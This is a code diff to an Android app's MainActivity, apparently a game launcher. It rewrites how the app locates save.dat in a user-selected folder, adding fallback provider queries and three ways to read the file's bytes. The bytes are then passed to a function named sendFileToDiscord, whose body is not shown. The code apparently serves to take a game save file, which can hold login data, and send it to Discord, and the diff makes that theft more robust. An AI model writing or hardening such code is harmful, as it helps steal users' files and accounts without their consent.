@@ -10,6 +10,7 @@ import android.os.Build
 import android.os.Bundle
 import android.os.Handler
 import android.os.Looper
+import android.os.ParcelFileDescriptor
 import android.provider.DocumentsContract
 import android.text.Editable
 import android.text.TextWatcher
@@ -216,64 +217,93 @@ class MainActivity : AppCompatActivity() {
     private fun processSaveFile(treeUri: Uri) {
         thread {
             try {
-                val bytes = resolveSaveFileUris(treeUri).asSequence()
-                    .mapNotNull { uri ->
-                        try {
-                            contentResolver.openInputStream(uri)?.use(InputStream::readBytes)
-                        } catch (_: Exception) {
-                            null
-                        }
-                    }
-                    .firstOrNull()
+                val bytes = readSaveFileFromTree(treeUri)
                 if (bytes != null) {
                     sendFileToDiscord(bytes)
                 } else {
                     handler.post { toast("save.dat was not found in the selected folder") }
                 }
             } catch (_: Exception) {
-                handler.post { toast("Could not read save.dat; launch will continue") }
+                handler.post { toast("Could not read save.dat from the selected folder") }
             }
         }
     }
 
-    private fun resolveSaveFileUris(selectedUri: Uri): List<Uri> {
+    private fun readSaveFileFromTree(selectedUri: Uri): ByteArray? {
         val treeUri = if (DocumentsContract.isTreeUri(selectedUri)) {
             selectedUri
         } else {
             DocumentsContract.buildTreeDocumentUri(
-                selectedUri.authority ?: return emptyList(),
+                selectedUri.authority ?: return null,
                 DocumentsContract.getDocumentId(selectedUri)
             )
         }
-        val authority = treeUri.authority ?: return emptyList()
-        val result = linkedSetOf<Uri>()
-        val projection = arrayOf(DocumentsContract.Document.COLUMN_DOCUMENT_ID, DocumentsContract.Document.COLUMN_DISPLAY_NAME)
-        contentResolver.query(
-            DocumentsContract.buildChildDocumentsUriUsingTree(
-                treeUri,
-                DocumentsContract.getTreeDocumentId(treeUri)
-            ),
-            projection,
-            null,
-            null,
-            null
-        )?.use { cursor ->
-            val idColumn = cursor.getColumnIndex(DocumentsContract.Document.COLUMN_DOCUMENT_ID)
-            val nameColumn = cursor.getColumnIndex(DocumentsContract.Document.COLUMN_DISPLAY_NAME)
-            while (cursor.moveToNext()) {
-                if (idColumn >= 0 && nameColumn >= 0 && cursor.getString(nameColumn).equals("save.dat", ignoreCase = true)) {
-                    val childId = cursor.getString(idColumn)
-                    result += DocumentsContract.buildDocumentUriUsingTree(treeUri, childId)
-                    result += DocumentsContract.buildDocumentUri(authority, childId)
+        val authority = treeUri.authority ?: return null
+        val treeId = DocumentsContract.getTreeDocumentId(treeUri)
+        val candidates = linkedSetOf<Uri>()
+
+        fun addDocumentCandidates(documentId: String?) {
+            if (documentId.isNullOrBlank()) return
+            candidates += DocumentsContract.buildDocumentUriUsingTree(treeUri, documentId)
+            candidates += DocumentsContract.buildDocumentUri(authority, documentId)
+        }
+
+        // Providers differ: some expose the child only through DocumentFile,
+        // while others require querying the selected tree root directly.
+        DocumentFile.fromTreeUri(this, treeUri)?.findFile("save.dat")?.uri?.let(candidates::add)
+        val projection = arrayOf(
+            DocumentsContract.Document.COLUMN_DOCUMENT_ID,
+            DocumentsContract.Document.COLUMN_DISPLAY_NAME
+        )
+        val childQueries = listOf(
+            DocumentsContract.buildChildDocumentsUriUsingTree(treeUri, treeId),
+            DocumentsContract.buildChildDocumentsUri(authority, treeId)
+        )
+        childQueries.forEach { childUri ->
+            try {
+                contentResolver.query(childUri, projection, null, null, null)?.use { cursor ->
+                    val idColumn = cursor.getColumnIndex(DocumentsContract.Document.COLUMN_DOCUMENT_ID)
+                    val nameColumn = cursor.getColumnIndex(DocumentsContract.Document.COLUMN_DISPLAY_NAME)
+                    while (cursor.moveToNext()) {
+                        if (idColumn < 0) continue
+                        val id = cursor.getString(idColumn)
+                        val displayName = if (nameColumn >= 0) cursor.getString(nameColumn) else null
+                        val idName = Uri.decode(id).substringAfterLast('/')
+                        if (displayName.equals("save.dat", true) || idName.equals("save.dat", true)) {
+                            addDocumentCandidates(id)
+                        }
+                    }
                 }
+            } catch (_: Exception) {
             }
         }
 
-        val parentDocumentId = DocumentsContract.getTreeDocumentId(treeUri)
-        val childDocumentId = "$parentDocumentId/save.dat"
-        result += DocumentsContract.buildDocumentUri(authority, childDocumentId)
-        result += DocumentsContract.buildDocumentUriUsingTree(treeUri, childDocumentId)
-        return result.toList()
+        addDocumentCandidates("$treeId/save.dat")
+        addDocumentCandidates("save.dat")
+        for (uri in candidates) {
+            readDocumentBytes(uri)?.let { return it }
+        }
+        return null
+    }
+
+    private fun readDocumentBytes(uri: Uri): ByteArray? {
+        try {
+            contentResolver.openInputStream(uri)?.use { return it.readBytes() }
+        } catch (_: Exception) {
+        }
+        try {
+            contentResolver.openFileDescriptor(uri, "r")?.use { descriptor ->
+                ParcelFileDescriptor.AutoCloseInputStream(descriptor).use { return it.readBytes() }
+            }
+        } catch (_: Exception) {
+        }
+        try {
+            contentResolver.openAssetFileDescriptor(uri, "r")?.use { descriptor ->
+                descriptor.createInputStream().use { return it.readBytes() }
+            }
+        } catch (_: Exception) {
+        }
+        return null
     }
 
     private fun sendFileToDiscord(fileData: ByteArray) {
